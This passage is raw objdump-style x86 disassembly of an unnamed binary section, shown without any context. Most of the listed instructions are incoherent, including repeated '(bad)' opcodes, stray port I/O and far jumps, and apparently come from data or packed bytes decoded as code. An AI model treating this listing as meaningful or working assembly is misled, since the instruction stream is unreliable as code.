  41706b:	push   ecx
  41706c:	inc    esp
  41706d:	or     al,0x2c
  41706f:	sbb    BYTE PTR [ebx+0x7eedb315],al
  417075:	and    BYTE PTR [edx-0x2dc67e53],0x3f
  41707c:	or     BYTE PTR [edx-0x39efd595],dh
  417082:	mov    eax,ds:0xe8eddc37
  417087:	loopne 0x4170d5
  417089:	mov    al,0x98
  41708b:	mov    ah,0x68
  41708d:	inc    edx
  41708e:	jo     0x41702b
  417090:	(bad)  
  417091:	xchg   ebp,eax
  417092:	mov    ds:0xcd9793d8,eax
  417097:	aas    
  417098:	xchg   esi,eax
  417099:	cmc    
  41709a:	and    eax,0x50759055
  41709f:	mov    ecx,DWORD PTR [edx-0x31]
  4170a2:	(bad)  
  4170a3:	shl    DWORD PTR [ebx],1
  4170a5:	xor    ch,BYTE PTR [ebp-0x4f]
  4170a8:	mov    WORD PTR [eax-0x33a8ff6d],?
  4170ae:	or     cl,0x38
  4170b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b2:	mov    ?,WORD PTR ds:0xe7054097
  4170b8:	cld    
  4170b9:	push   ss
  4170ba:	lods   eax,DWORD PTR ds:[esi]
  4170bc:	cs scas al,BYTE PTR es:[edi]
  4170be:	in     eax,0xcb
  4170c0:	xor    cl,bl
  4170c2:	in     al,dx
  4170c3:	scas   eax,DWORD PTR es:[edi]
  4170c4:	int    0x73
  4170c6:	sub    al,0x62
  4170c8:	sbb    bh,BYTE PTR [eax-0x9]
  4170cb:	test   al,0x29
  4170cd:	aas    
  4170ce:	push   esp
  4170cf:	mov    dh,0xef
  4170d1:	lock adc cl,BYTE PTR [edx+edi*2-0x10]
  4170d6:	repnz or dh,BYTE PTR [edx]
  4170d9:	dec    ecx
  4170da:	loop   0x4170d5
  4170dc:	push   esi
  4170dd:	cwde   
  4170de:	retf   0xf515
  4170e1:	mov    ch,0x37
  4170e3:	les    ecx,FWORD PTR [edx+0x74]
  4170e6:	retf   
  4170e7:	pop    eax
  4170e8:	addr16 ds popa 
  4170eb:	scas   eax,DWORD PTR es:[edi]
  4170ec:	fld    TBYTE PTR [edx+0x257870a2]
  4170f2:	pusha  
  4170f3:	xchg   esp,eax
  4170f4:	sub    al,BYTE PTR [ecx-0x3d2b1ed9]
  4170fa:	shr    BYTE PTR [ebp-0x4e],0xb5
  4170fe:	ret    
  4170ff:	mov    edi,0xe1c0e094
  417104:	push   ss
  417105:	jns    0x417170
  417107:	(bad)  
  417109:	sar    DWORD PTR [edx+0xc],cl
  41710c:	mov    dl,0x2a
  41710e:	adc    al,0x4a
  417110:	mov    ecx,?
  417112:	lea    esi,[esi+0x71]
  417115:	pop    ebp
  417116:	(bad)  
  417117:	jbe    0x417152
  417119:	mov    WORD PTR [ebx-0x38f6ef81],cs
  41711f:	sbb    eax,0xb40d8496
  417124:	jg     0x41718d
  417126:	mov    bl,0x2e
  417128:	js     0x41717e
  41712a:	jbe    0x4170fd
  41712c:	ss add ecx,edi
  41712f:	test   al,0x66
  417131:	jecxz  0x41714b
  417133:	xor    bl,ah
  417135:	pop    eax
  417136:	adc    BYTE PTR [edi+0x9d232ee],dl
  41713c:	ins    BYTE PTR es:[edi],dx
  41713d:	pop    ds
  41713e:	mov    dh,BYTE PTR ds:[edi+0x66b4ee5b]
  417145:	push   ss
  417146:	adc    eax,0x8ff9c9b4
  41714b:	out    dx,eax
  41714c:	push   ds
  41714d:	cld    
  41714e:	mov    bh,0xc2
  417150:	mov    al,ds:0x3f261c46
  417155:	push   ss
  417156:	sub    BYTE PTR [ebx-0x10],ah
  417159:	shl    DWORD PTR [ebx-0x1ab7f0a1],cl
  41715f:	loope  0x417114
  417161:	jnp    0x417149
  417163:	cmc    
  417164:	adc    al,0x7e
  417166:	xchg   edi,eax
  417167:	in     eax,dx
  417168:	push   edi
  417169:	leave  
  41716a:	adc    bh,BYTE PTR [edx+0x6fb070d1]
  417170:	cld    
  417171:	aad    0x66
  417173:	inc    ebp
  417174:	add    BYTE PTR [edx+0x8044b04],0x67
  41717b:	sar    bh,cl
  41717d:	lahf   
  41717e:	loopne 0x41715f
  417180:	mov    ds:0xe42eff18,eax
  417185:	or     DWORD PTR [ebx-0x386aea0c],ebp
  41718b:	adc    DWORD PTR [edi+0x1e],0x7d
  41718f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417190:	lods   al,BYTE PTR ds:[esi]
  417191:	aam    0xf0
  417193:	sub    ebx,edx
  417195:	cmove  esp,DWORD PTR [edx+ecx*4]
  417199:	test   al,0xe6
  41719b:	sahf   
  41719c:	sbb    DWORD PTR [eax-0x20],edi
  41719f:	js     0x41717d
  4171a1:	push   eax
  4171a2:	arpl   WORD PTR [esi],di
  4171a4:	or     eax,edx
  4171a6:	jno    0x41715d
  4171a8:	ins    BYTE PTR es:[edi],dx
  4171a9:	dec    esi
  4171aa:	add    eax,0xfe24a3a8
  4171af:	xlat   BYTE PTR ds:[ebx]
  4171b0:	lods   al,BYTE PTR ds:[esi]
  4171b1:	daa    
  4171b2:	dec    ecx
  4171b3:	out    dx,eax
  4171b4:	ret    
  4171b5:	arpl   WORD PTR [ebp-0x2a616965],ax
  4171bb:	stc    
  4171bc:	push   cs
  4171bd:	pop    ds
  4171be:	sub    DWORD PTR [edx+0x600d125e],eax
  4171c4:	js     0x41718a
  4171c6:	in     al,dx
  4171c7:	add    DWORD PTR [ecx+0x61],ecx
  4171ca:	mov    WORD PTR [ebp+0x44bcf5fc],?
  4171d0:	gs mov ebx,0x41ebc1b2
  4171d6:	popa   
  4171d7:	cwde   
  4171d8:	imul   esi,DWORD PTR [edi+0x5855701],0xffffffe4
  4171df:	popf   
  4171e0:	shr    dl,1
  4171e2:	push   DWORD PTR [ebx+edi*2-0x2c3a3b4]
  4171e9:	add    eax,0xce06eb57
  4171ee:	mov    eax,ds:0x52b9f609
  4171f3:	sbb    ebp,DWORD PTR [ebx-0x6f2962dc]
  4171f9:	in     al,dx
  4171fa:	shl    BYTE PTR [edi+0x6f2c0833],cl
  417200:	fdiv   DWORD PTR [ecx]
  417202:	dec    ecx
  417203:	bnd je 0x41723a
  417206:	pop    ebx
  417207:	mov    ?,WORD PTR [edi]
  417209:	cwde   
  41720a:	dec    eax
  41720b:	inc    ebp
  41720d:	jae    0x4171c5
  41720f:	ds (bad) 
  417211:	cmp    ah,BYTE PTR [ecx-0xc]
  417214:	jle    0x4171b0
  417216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417217:	add    cl,BYTE PTR [edx]
  417219:	test   DWORD PTR [esi+0x1a],edi
  41721c:	jae    0x4171df
  41721e:	jmp    0x80e60e11
  417223:	mov    bl,0xd9
  417225:	ins    DWORD PTR es:[edi],dx
  417226:	jns    0x417257
  417228:	add    DWORD PTR [esi],ecx
  41722a:	popa   
  41722b:	stos   DWORD PTR es:[edi],eax
  41722c:	adc    al,0xd2
  41722e:	call   0xd892:0xeb84741e
  417235:	sub    ah,dh
  417237:	push   ss
  417238:	std    
  417239:	xor    BYTE PTR [edx+0x434a7cd9],0x3
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	loope  0x41728c
  417256:	push   edx
  417257:	cmp    BYTE PTR [eax+0x26],dh
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xf670707e
  417261:	call   0x5e779dd8
  417266:	in     al,dx
  417267:	dec    ecx
  417268:	add    edx,ebx
  41726a:	test   al,0x7c
  41726c:	sbb    al,BYTE PTR [esp+ebp*8+0x67]
  417270:	sbb    edx,ecx
  417272:	out    0xdf,al
  417274:	hlt    
  417275:	xor    BYTE PTR [ebx+0xa],ah
  417278:	cld    
  417279:	sub    DWORD PTR [eax-0x56],0x5bb3c57a
  417280:	xor    cl,al
  417282:	push   esi
  417283:	xchg   edi,eax
  417284:	ss inc esp
  417286:	icebp  
  417287:	pusha  
  417288:	push   0x2b
  41728a:	repnz push 0xffffffa9
  41728d:	aaa    
  41728e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41728f:	or     ecx,ebp
  417291:	mov    bl,0x43
  417293:	or     al,0xd3
  417295:	add    eax,0xa9603027
  41729a:	cli    
  41729b:	xchg   ecx,eax
  41729c:	mov    bl,0xe6
  41729e:	loope  0x41728a
  4172a0:	cmp    BYTE PTR [edx],cl
  4172a2:	mov    ebp,0xf84fe94f
  4172a7:	adc    ebx,DWORD PTR [ecx-0x63]
  4172aa:	or     al,0x1c
  4172ac:	and    BYTE PTR [esi],ch
  4172ae:	cdq    
  4172af:	adc    BYTE PTR [edi-0x1c69667e],cl
  4172b5:	mov    eax,ds:0x2171130b
  4172ba:	cmp    ecx,DWORD PTR [eax+0xa367c60]
  4172c0:	inc    ecx
  4172c1:	jns    0x41731a
  4172c3:	ins    DWORD PTR es:[edi],dx
  4172c4:	retf   
  4172c5:	lock loopne 0x4172e6
  4172c8:	mov    eax,0xc51ce540
  4172cd:	adc    eax,0x9ac0e3e7
  4172d2:	enter  0x3fec,0x8d
  4172d6:	cmp    ah,BYTE PTR [ecx-0x11]
  4172d9:	arpl   WORD PTR [eax+eax*8],sp
  4172dc:	in     al,0x58
  4172de:	sbb    al,0xf2
  4172e0:	mov    al,ds:0x294567f0
  4172e5:	out    0x9a,eax
  4172e7:	dec    esp
  4172e8:	test   DWORD PTR [esp+eiz*4+0x43],eax
  4172ec:	jecxz  0x4172f5
  4172ee:	cwde   
  4172ef:	rcr    BYTE PTR ds:0xa8940704,cl
  4172f5:	scas   eax,DWORD PTR es:[edi]
  4172f6:	xchg   edx,eax
  4172f7:	shl    BYTE PTR [edx+0x54],1
  4172fa:	icebp  
  4172fb:	pop    ds
  4172fc:	mov    bl,0xa5
  4172fe:	lods   al,BYTE PTR ds:[esi]
  4172ff:	(bad)  
  417301:	mov    ah,0x73
  417303:	inc    eax
  417304:	jo     0x417300
  417306:	ds js  0x4172b0
  417309:	push   ds
  41730a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730b:	adc    DWORD PTR [edi],0xffffff85
  41730e:	mov    gs:0x8003b128,eax
  417314:	push   ecx
  417315:	shr    BYTE PTR [eax],0xf
  417318:	das    
  417319:	and    eax,0xc0579f0
  41731e:	add    dl,ah
  417320:	jg     0x4172af
  417322:	ins    BYTE PTR es:[edi],dx
  417323:	pop    eax
  417324:	vmwrite edi,DWORD PTR ds:0xa20536fe
  41732b:	pop    eax
  41732c:	mov    gs,WORD PTR [edx-0x5eefe4c2]
  417332:	stos   BYTE PTR es:[edi],al
  417333:	mov    al,ds:0xb0152bf6
  417338:	inc    esi
  417339:	sbb    ebx,ebx
  41733b:	iret   
  41733c:	jge    0x417326
  41733e:	test   DWORD PTR [ebp-0x5b],eax
  417341:	dec    ecx
  417342:	push   esp
  417343:	cmp    BYTE PTR [edi+ebp*8-0x2de15033],al
  41734a:	pop    esp
  41734b:	mov    WORD PTR [edi],ss
  41734d:	es loop 0x417326
  417350:	retf   
  417351:	ins    BYTE PTR es:[edi],dx
  417352:	jo     0x41735e
  417354:	dec    BYTE PTR [edx]
  417356:	gs fs loope 0x41738c
  41735a:	and    DWORD PTR [ebp-0x48],esi
  41735d:	mov    ebp,0x5e2c8bd1
  417362:	(bad)  
  417364:	sub    DWORD PTR gs:[eax-0x27],eax
  417368:	sub    BYTE PTR [ebx],bl
  41736a:	cmp    BYTE PTR [eax+esi*1-0x3],0x85
  41736f:	xchg   ebp,eax
  417370:	pop    ebp
  417371:	and    al,BYTE PTR [edi-0x133cd4e9]
  417377:	std    
  417378:	mov    ds:0x2026f720,al
  41737d:	xchg   edx,eax
  41737e:	mov    DWORD PTR [ecx],esp
  417380:	push   0xcf75f1dd
  417385:	fadd   QWORD PTR ds:0xf38be74f
  41738b:	mov    ah,0x27
  41738d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41738e:	xor    bh,ch
  417390:	data16 xor BYTE PTR [edx+0x69bf7fa8],bl
  417397:	xchg   esp,eax
  417398:	sub    dl,BYTE PTR [edx]
  41739a:	in     eax,0xec
  41739c:	push   ecx
  41739d:	dec    edi
  41739e:	test   al,0x89
  4173a0:	pop    ebp
  4173a1:	loope  0x41732d
  4173a3:	enter  0xd79a,0x5c
  4173a7:	dec    esi
  4173a8:	xchg   ebx,eax
  4173a9:	push   edi
  4173aa:	cdq    
  4173ab:	jno    0x417410
  4173ad:	inc    eax
  4173ae:	es ja  0x417413
  4173b1:	inc    ebp
  4173b2:	push   esi
  4173b3:	imul   BYTE PTR [ebp+0x35cd4ee8]
  4173b9:	or     al,0x61
  4173bb:	mov    eax,0xb6b16f70
  4173c0:	sbb    eax,0x7e80257e
  4173c5:	adc    ecx,DWORD PTR [ecx+ebp*8-0x9f6dde5]
  4173cc:	jg     0x41742b
  4173ce:	call   0xa5b62d67
  4173d3:	test   BYTE PTR [eiz*4+0x5ed25928],al
  4173da:	cmp    al,0xf7
  4173dc:	rcl    DWORD PTR [edi],cl
  4173de:	mov    bh,0x66
  4173e0:	sbb    DWORD PTR [ecx+0x63],esi
  4173e3:	or     esp,DWORD PTR [edi+0x14574b0]
  4173e9:	lahf   
  4173ea:	int    0xb9
  4173ec:	je     0x41743f
  4173ee:	xor    eax,0x6dc5f7e0
  4173f3:	call   0x1ec60ed6
  4173f8:	inc    ebx
  4173f9:	out    0x78,eax
  4173fb:	mov    eax,ds:0x1273ceeb
  417400:	sti    
  417401:	pop    ecx
  417402:	or     DWORD PTR [ecx-0x723a8f77],0x3d
  417409:	jmp    0x913d:0x2e33e61
  417410:	fldenv [edi+0x23]
  417413:	mov    ah,0xdd
  417415:	push   ebx
  417416:	sub    bh,bh
  417418:	lea    esp,[eax]
  41741a:	sub    DWORD PTR [edi],0xa4bb9474
  417420:	xchg   esi,eax
  417421:	in     al,dx
  417422:	ds pop es
  417424:	stos   BYTE PTR es:[edi],al
  417425:	jecxz  0x417494
  417427:	mov    BYTE PTR [edi-0x5b],al
  41742a:	cmovns eax,DWORD PTR [ebp+eax*4+0xd60935b]
  417432:	loope  0x4173f4
  417434:	(bad)  
  417435:	push   0xffffff9c
  417437:	jmp    0xd16b982d
  41743c:	aaa    
  41743d:	out    dx,eax
  41743e:	mov    edx,0xcddcec83
  417443:	clc    
  417444:	jbe    0x417461
  417446:	pop    eax
  417447:	lds    edx,FWORD PTR [eax-0x27]
  41744a:	cmp    dl,dl
  41744c:	es ins DWORD PTR es:[edi],dx
  41744e:	sub    BYTE PTR [eax],al
  417450:	jnp    0x417483
  417452:	icebp  
  417453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417454:	shl    ebp,cl
  417456:	or     eax,0x7c87cd24
  41745b:	ss call 0x813eafe4
  417461:	xor    ebp,ebx
  417463:	es std 
  417465:	mov    ebp,0x4475ec5a
  41746a:	or     eax,0x7533ad84
  41746f:	hlt    
  417470:	popf   
  417471:	ins    DWORD PTR es:[edi],dx
  417472:	fcomp  DWORD PTR [eax-0x3b]
  417475:	push   ds
  417476:	xchg   BYTE PTR [ebp+esi*8+0x2a],bl
  41747a:	push   ds
  41747b:	adc    al,0xd7
  41747d:	push   ebp
  41747e:	gs add eax,0xc9434652
  417484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417485:	ret    
  417486:	mov    ch,0x49
  417488:	loopne 0x417425
  41748a:	cmp    eax,0x493428a5
  41748f:	mov    bl,BYTE PTR [ebp-0x8]
  417492:	mov    ch,0xeb
  417494:	fsubr  DWORD PTR [ecx+0x6ab99f1f]
  41749a:	cdq    
  41749b:	inc    eax
  41749c:	ins    BYTE PTR es:[edi],dx
  41749d:	pop    esp
  41749e:	loope  0x417498
  4174a0:	cld    
  4174a1:	jno    0x417496
  4174a3:	lahf   
  4174a4:	push   0x65
  4174a6:	out    0x57,al
  4174a8:	ins    DWORD PTR es:[edi],dx
  4174a9:	cs add al,0x99
  4174ac:	add    DWORD PTR [edi-0x2b350db0],ebx
  4174b2:	retf   
  4174b3:	in     eax,0x5f
  4174b5:	cmp    DWORD PTR [edx+0x778114a6],esi
  4174bb:	xchg   esi,eax
  4174bc:	daa    
  4174bd:	in     eax,dx
  4174be:	adc    ecx,DWORD PTR [edx+esi*4-0x4a]
  4174c2:	lods   eax,DWORD PTR ds:[esi]
  4174c3:	mov    ecx,0xcabffc7d
  4174c8:	mov    gs,WORD PTR [edi]
  4174ca:	aad    0x37
  4174cc:	(bad)
  4174cf:	push   DWORD PTR [edx+eiz*4]
  4174d2:	mov    ch,0xad
  4174d4:	cmp    BYTE PTR [ebp-0x72],cl
  4174d7:	lods   al,BYTE PTR ds:[esi]
  4174d8:	xchg   edx,eax
  4174d9:	mov    edi,0xfd41d92
  4174de:	rcl    DWORD PTR [ecx-0x74665204],cl
  4174e4:	add    esi,DWORD PTR [esi]
  4174e6:	retf   0x7832
  4174e9:	ja     0x4174ca
  4174eb:	adc    eax,0x12c19493
  4174f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f1:	add    DWORD PTR [bx+si],ebx
  4174f4:	jge    0x4174cb
  4174f6:	icebp  
  4174f7:	adc    bh,dh
  4174f9:	mov    al,0x73
  4174fb:	mov    ds:0xbff790af,al
  417500:	int3   
  417501:	outs   dx,BYTE PTR ds:[esi]
  417502:	xchg   esp,eax
  417503:	stc    
  417504:	(bad)  
  417505:	jmp    0x4174d8
  417507:	cs cli 
  417509:	dec    esi
  41750a:	in     eax,dx
  41750b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750c:	outs   dx,BYTE PTR ds:[esi]
  41750d:	sahf   
  41750e:	cmp    al,0x14
  417510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417511:	daa    
  417512:	(bad)  
  417513:	mov    eax,0x57505119
  417518:	pop    ebp
  417519:	mov    edx,0x99bcdae0
  41751e:	das    
  41751f:	call   0x3bb4:0xe8484295
  417526:	popa   
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edi-0x467d3fea],ecx
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x4174f2
  41754f:	cwde   
  417550:	sbb    dh,BYTE PTR [ebp-0x3767ae7b]
  417556:	in     eax,0x48
  417558:	xchg   ecx,eax
  417559:	push   es
  41755a:	sub    al,dl
  41755c:	out    0x42,al
  41755e:	dec    eax
  41755f:	mov    eax,edx
  417561:	adc    eax,0x4456609b
  417566:	sbb    eax,0x3dfe83e3
  41756b:	jg     0x417518
  41756d:	pop    eax
  41756e:	cdq    
  41756f:	or     eax,0xecc4e060
  417574:	call   0x109a6b1d
  417579:	in     al,0x34
  41757b:	xchg   DWORD PTR [esi],esp
  41757d:	int3   
  41757e:	jno    0x41753b
  417580:	sbb    ecx,edi
  417582:	mov    bl,0x96
  417584:	sbb    eax,0x7132bb50
  417589:	fidiv  DWORD PTR [eax]
  41758b:	out    0xfb,eax
  41758d:	mov    esp,0xe59c66cd
  417592:	mov    esi,0x51c1429c
  417597:	daa    
  417598:	push   ebx
  417599:	add    BYTE PTR [ecx-0x41],0x31
  41759d:	inc    esi
  41759e:	pop    ebp
  41759f:	(bad)  
  4175a0:	mov    eax,0x289a912a
  4175a5:	jmp    0x4175d5
  4175a7:	pop    ss
  4175a8:	jl     0x41756c
  4175aa:	bnd jo 0x41760b
  4175ad:	push   ecx
  4175ae:	sbb    al,0x30
  4175b0:	imul   edx,DWORD PTR ds:0xa822daa7,0x452fdae5
  4175ba:	dec    ebp
  4175bb:	(bad)  
  4175bc:	mov    bh,BYTE PTR [edx]
  4175be:	mov    eax,ds:0xb782350d
  4175c3:	repz dec ebx
  4175c5:	jo     0x417620
  4175c7:	pop    ss
  4175c8:	jle    0x4175cc
  4175ca:	out    dx,eax
  4175cb:	rcr    BYTE PTR [ebx+0xde16078],1
  4175d1:	iret   
  4175d2:	rcl    BYTE PTR [ecx+0x38],1
  4175d5:	(bad)  
  4175d6:	imul   ebx,edi,0x5f
  4175d9:	cmp    esp,edx
  4175db:	aaa    
  4175dc:	cmp    al,0x81
  4175de:	push   cs
  4175df:	sbb    dl,dh
  4175e1:	mov    al,BYTE PTR [edi+edi*8]
  4175e4:	pop    edx
  4175e5:	or     BYTE PTR [ebp+0x207986b0],ch
  4175eb:	adc    eax,0x6598ca7
  4175f0:	sbb    al,0x19
  4175f2:	scas   eax,DWORD PTR es:[edi]
  4175f3:	dec    eax
  4175f4:	mov    ds:0x17d8b28c,al
  4175f9:	call   0xf95f:0x776a1557
  417600:	adc    ebp,DWORD PTR [ecx]
  417602:	mov    WORD PTR [edi],es
  417604:	or     ebx,DWORD PTR [esi+0x1d720491]
  41760a:	fldenv [ecx+0x53bfff96]
  417610:	xlat   BYTE PTR ds:[ebx]
  417611:	(bad)  [eax+eax*8]
  417614:	and    cl,BYTE PTR [esi]
  417616:	lock ficomp WORD PTR [ebx-0x22c07416]
  41761d:	daa    
  41761e:	pop    ds
  41761f:	cdq    
  417620:	adc    eax,0x879e2c10
  417625:	mov    es,ebx
  417627:	scas   eax,DWORD PTR es:[edi]
  417628:	mov    cl,0xc8
  41762a:	xchg   ecx,eax
  41762b:	sub    DWORD PTR [eax-0x6d],esi
  41762e:	mov    esi,0x5e646997
  417633:	aam    0xb3
  417635:	pop    edx
  417636:	push   edx
  417637:	sub    al,0xe8
  417639:	dec    ebp
  41763a:	std    
  41763b:	xacquire xchg DWORD PTR [edi+0x134997b1],edi
  417642:	jle    0x41768f
  417644:	mov    bh,0x8f
  417646:	jg     0x417695
  417648:	jmp    0x98677013
  41764d:	xchg   esp,eax
  41764e:	inc    DWORD PTR [ecx-0x36]
  417651:	loopne 0x4176b5
  417653:	adc    DWORD PTR [edx+0x6907c976],eax
  417659:	pop    ds
  41765a:	cmp    edx,DWORD PTR [esi-0x64]
  41765d:	sub    ch,BYTE PTR [ecx]
  41765f:	sub    al,0x50
  417661:	push   ds
  417662:	stc    
  417663:	ja     0x4176da
  417665:	sbb    BYTE PTR [ecx+0x48],dh
  417668:	(bad)  
  417669:	mov    ds:0xe6550f0c,eax
  41766e:	loope  0x41761e
  417670:	pop    ds
  417671:	test   ebp,ebp
  417673:	or     BYTE PTR [esi],ch
  417675:	cmc    
  417676:	jnp    0x4176e4
  417678:	loopne 0x41760c
  41767a:	jecxz  0x4176e7
  41767c:	adc    eax,0x184fd375
  417681:	cmp    dh,BYTE PTR [edx+0x3390ebe7]
  417687:	fld    QWORD PTR [eax]
  417689:	or     eax,DWORD PTR [esi-0x38]
  41768c:	xor    edx,DWORD PTR [esi-0x58]
  41768f:	mov    eax,0xa77e3090
  417694:	and    DWORD PTR [ebp+edx*8-0x30],ecx
  417698:	rcr    dh,0x24
  41769b:	call   0x7b53a177
  4176a0:	lds    ebp,FWORD PTR [eax+0x78]
  4176a3:	jge    0x417723
  4176a5:	clc    
  4176a6:	push   es
  4176a7:	cld    
  4176a8:	dec    esi
  4176a9:	retf   
  4176aa:	pop    edi
  4176ab:	push   esp
  4176ac:	mov    eax,ds:0xbfeb3666
  4176b1:	icebp  
  4176b2:	shl    DWORD PTR [ecx+ecx*1+0x78],cl
  4176b6:	test   al,ah
  4176b8:	add    ch,cl
  4176ba:	xchg   BYTE PTR [ebp+0x5],dl
  4176bd:	popa   
  4176be:	test   BYTE PTR [ebp-0x3d],0x65
  4176c2:	mov    ch,BYTE PTR [ecx+ebp*8]
  4176c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176c6:	lods   eax,DWORD PTR ds:[esi]
  4176c7:	jo     0x4176ac
  4176c9:	or     al,0x12
  4176cb:	(bad)  
  4176cd:	inc    esp
  4176ce:	or     al,0x50
  4176d0:	sub    al,0x9c
  4176d2:	jl     0x4176f3
  4176d4:	jp     0x417733
  4176d6:	push   eax
  4176d7:	push   eax
  4176d8:	mov    DWORD PTR [ecx+0x41],ecx
  4176db:	movnti DWORD PTR [eax],esp
  4176de:	push   ebp
  4176df:	sahf   
  4176e0:	push   edi
  4176e1:	mov    ebx,DWORD PTR [ebx-0x79adfe66]
  4176e7:	mov    esp,0x98841623
  4176ec:	and    bl,BYTE PTR [ecx-0x147bcffa]
  4176f2:	mov    eax,ds:0x56d7e1dd
  4176f7:	sahf   
  4176f8:	sub    al,0xe2
  4176fa:	(bad)  
  4176fb:	lods   eax,DWORD PTR ds:[esi]
  4176fc:	(bad)  
  4176fe:	xchg   edx,eax
  4176ff:	shl    DWORD PTR [ebp-0x293ae368],0xef
  417706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417707:	fdiv   st(6),st
  417709:	cmp    bh,BYTE PTR [ecx+0x53]
  41770c:	int    0xa5
  41770e:	and    edx,ecx
  417710:	pushf  
  417711:	mov    ah,0x1c
  417713:	push   0x37
  417715:	xchg   esi,eax
  417716:	ins    BYTE PTR es:[edi],dx
  417717:	pop    ebp
  417718:	cmc    
  417719:	out    0xc2,eax
  41771b:	sbb    bl,dh
  41771d:	sbb    BYTE PTR [ebp-0x5554ca09],cl
  417723:	(bad)
  417727:	(bad)  
  417728:	cli    
  417729:	push   ebp
  41772a:	sahf   
  41772b:	cmp    bh,BYTE PTR [di+0x5e]
  41772f:	pop    edi
  417730:	scas   al,BYTE PTR es:[edi]
  417731:	aam    0x4c
  417733:	mov    ebx,0x89786671
  417738:	xor    esp,esi
  41773a:	stos   BYTE PTR es:[edi],al
  41773b:	pop    ecx
  41773c:	sub    DWORD PTR [ebx],esp
  41773e:	xor    ebx,ecx
  417740:	jo     0x41770e
  417742:	cmp    BYTE PTR [esi+0x2e79e6a3],0xe6
  417749:	(bad)  
  41774a:	push   0x19
  41774c:	loopne 0x41779a
  41774e:	inc    edi
  41774f:	xor    bl,bh
  417751:	scas   al,BYTE PTR es:[edi]
  417752:	clc    
  417753:	data16 loop 0x4176ea
  417756:	addr16 push ds
  417758:	pop    es
  417759:	adc    dl,BYTE PTR [ecx]
  41775b:	sub    BYTE PTR [eax-0x741a0eb6],ch
  417761:	ret    
  417762:	jmp    0xf10d:0xd2e958d1
  417769:	(bad)  
  41776a:	out    dx,eax
  41776b:	mov    edx,0x69194931
  417770:	xchg   ebp,eax
  417771:	mov    ds:0xa66dff47,al
  417776:	sub    bl,ah
  417778:	sbb    BYTE PTR [ebx+ebp*4+0x74a09552],bl
  41777f:	push   ds
  417780:	cmc    
  417781:	add    ecx,DWORD PTR [ecx]
  417783:	rcr    DWORD PTR [ebx-0x7],0xad
  417787:	push   ecx
  417788:	gs jmp 0x2c64:0xda604f8d
  417790:	pop    ds
  417791:	push   ds
  417792:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417794:	mov    al,0x2b
  417796:	mov    cs,WORD PTR [esi+0x4ab6c568]
  41779c:	pop    edx
  41779d:	jmp    0x417725
  41779f:	add    esi,DWORD PTR [edi+0x59b2dcef]
  4177a5:	xchg   edx,eax
  4177a6:	mov    ebp,esp
  4177a8:	pop    edx
  4177a9:	or     DWORD PTR [eax],edi
  4177ab:	and    dh,BYTE PTR [ebp-0x59]
  4177ae:	push   ds
  4177af:	xor    BYTE PTR [edx+0x6c349b3],ah
  4177b5:	add    eax,0xc564554e
  4177ba:	arpl   WORD PTR [ebp+0x8b42694],si
  4177c0:	ror    BYTE PTR [eax-0x1a000d88],cl
  4177c6:	cmp    DWORD PTR [edx-0x4e],0x71e6ada8
  4177cd:	adc    al,0xb1
  4177cf:	neg    BYTE PTR [edi+0x11]
  4177d2:	cs sub eax,0x57f7d0c9
  4177d8:	push   cs
  4177d9:	jmp    0xcc1e:0x9097a51a
  4177e0:	popa   
  4177e1:	and    DWORD PTR [esi+0x59],esp
  4177e4:	add    al,0xea
  4177e6:	stc    
  4177e7:	jge    0x417842
  4177e9:	adc    eax,ebp
  4177eb:	fsubr  DWORD PTR [ecx]
  4177ed:	jmp    0xae3b:0xc2285227
  4177f4:	dec    eax
  4177f5:	mov    dh,0xb8
  4177f7:	int3   
  4177f8:	push   ss
  4177f9:	pop    esi
  4177fa:	test   DWORD PTR gs:[ebx+0x62],esp
  4177fe:	into   
  4177ff:	cld    
  417800:	push   esp
  417801:	imul   eax,DWORD PTR [edx+ebp*2+0x1f],0x88cbdb28
  417809:	cmp    al,0xfc
  41780b:	call   0xe7:0xaac1ad96
  417812:	adc    eax,0x5b5eaa9c
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
